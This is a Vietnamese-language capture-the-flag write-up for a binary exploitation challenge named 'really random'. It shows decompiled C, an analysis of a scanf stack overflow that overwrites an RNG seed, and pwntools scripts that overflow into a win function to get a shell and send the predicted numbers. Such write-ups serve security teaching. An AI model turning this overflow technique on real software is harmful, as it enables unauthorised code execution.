# really random

1 chall khá bịp đòi hỏi sự tinh mắt và kinh nghiệm

## ida

```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char v5[112]; // [rsp+0h] [rbp-80h] BYREF
  unsigned int seed; // [rsp+70h] [rbp-10h]
  int k; // [rsp+74h] [rbp-Ch]
  int j; // [rsp+78h] [rbp-8h]
  int i; // [rsp+7Ch] [rbp-4h]

  signal(14, (__sighandler_t)sig_handler);
  alarm(0x14u);
  setup();
  seed = rand();
  printf("What is your name? ");
  __isoc99_scanf("%s", v5);
  printf("Hello %s\nLet's try how much you know about random.", v5);
  srand(seed);
  for ( i = 0; i <= 9; ++i )
  {
    v3 = rand();
    v[i] = rc4(v3, seed);
  }
  puts("Guess my numbers!");
  for ( j = 0; j <= 9; ++j )
    __isoc99_scanf("%d", &input[j]);
  for ( k = 0; k <= 9; ++k )
  {
    if ( v[k] != input[k] )
    {
      puts("You didn't make it :(");
      exit(0);
    }
  }
  printf("Correct!");
  return 0;
}
```

nếu nhìn ko kĩ thì tưởng bài này setup srand() với biến seed random là ra , ta làm thử cách này nha:

## test

```python
from pwn import *
from ctypes import CDLL

exe = ELF("./random_patched")
libc = CDLL("./libc6_2.31-0ubuntu9.9_amd64.so")
context.binary = exe
# p = process([exe.path])
p = remote('cybergon2023.webhop.me', 5003)

# gdb.attach(p, gdbscript = '''
# b*main+159
# b*random_check+70          
# c
# '''          
# )
           
# input()

seed = libc.rand()

print(seed)

libc.srand(libc.time(seed))

payload = b'a'*17*8

payload += p64(exe.sym['potato'] + 1)

p.sendline(payload)


a = libc.rand()

p.sendline(str((a + seed) % 256))

a = libc.rand()

p.sendline(str((a + seed) % 256))

a = libc.rand()

p.sendline(str((a + seed) % 256))

a = libc.rand()

p.sendline(str((a + seed) % 256))

a = libc.rand()

p.sendline(str((a + seed) % 256))

a = libc.rand()

p.sendline(str((a + seed) % 256))

a = libc.rand()

p.sendline(str((a + seed) % 256))

a = libc.rand()

p.sendline(str((a + seed) % 256))

a = libc.rand()

p.sendline(str((a + seed) % 256))

a = libc.rand()

p.sendline(str((a + seed) % 256))

p.interactive()
```

![image](https://github.com/gookoosss/CTF/assets/128712571/5445490a-106b-421d-8f83-991d32bdd71c)


hmm không được rồi nè, h ta phải ta debug để xem sai chỗ nào 

## phân tích

- đọc ida thì ta thấy char v5[112], ngay sau đó là biến seed 8byte
- biến seed được set 1 random 1 số ngấu nhiên
- nhưng ở đây thì ta thấy cố lỗi BOF ở scanf, nếu vậy thì ta hoàn có thể gán giá trị cho biến seed cố định theo ý mình mà ko còn là ngẫu nhiên nữa
- vì seed ta có thể cho cố định được nên  srand(seed) cũng thế do nó phụ thuộc vào seed
- srand(seed) cố định rồi nên chắc chắn dù ta có chạy chương trình bao nhiêu lần đi chăng nữa thì hàm rc4 cũng sẽ luôn luôn trả về những số cố định trong mỗi vòng lặp
- vì là số cố định nên ta có thể lưu lại vào dictionary để gán vào mỗi lần nhập
- lần nhập đầu có lỗi BOF nên ta sẽ dùng nó để ret2win đến hàm potato để lấy shell luôn

## Khai thác

(chall này cũng ko có gì nói nhiều nên mình sẽ giải thích cách làm luôn trong script, các bạn tham khảo qua)

## script

```python
from pwn import *


exe = ELF("./random")
context.binary = exe
p = process([exe.path])
# p = remote('cybergon2023.webhop.me', 5003)

gdb.attach(p, gdbscript = '''
b*main+402
c
'''          
)
           
input()

# lúc đầu seed = 0x6b8b4567

payload = b'a' * 136 
# tới đây ta đã tràn biến nên seed cũng thành 0x6161616161616161 (1 giá trị cố định)
payload += p64(exe.sym['potato'] + 1)

p.sendline(payload)

# vì srand(seed) cố định nên giá trị rand() mỗi vòng lặp cũng cố định
# ta lưu những kết quả đó vào dictionary

value = [
    0x2d,
    0xffffff28,
    0xc,
    0xffffff4c,
    0x0,
    0xffffff0a,
    0xffffff61,
    0xffffffd6,
    0xffffff38,
    0xffffffa6,
]

for x in value:
    p.sendline(str(x))

p.interactive()
```
